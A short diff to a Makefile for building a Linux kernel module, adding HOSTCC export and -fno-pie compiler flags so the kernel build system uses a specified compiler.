@@ -28,6 +28,11 @@ endif
 
 # Export compiler for kernel build system
 export CC := $(KERNEL_CC)
+export HOSTCC := $(KERNEL_CC)
+
+# Force the kernel build system to use our compiler
+EXTRA_CFLAGS += -fno-pie
+KBUILD_CFLAGS += -fno-pie
 
 # kernel vars cant define with patsubst for some fucking reason
 obj-m := shrk_$(SHRK_CLIENT_ID).o 
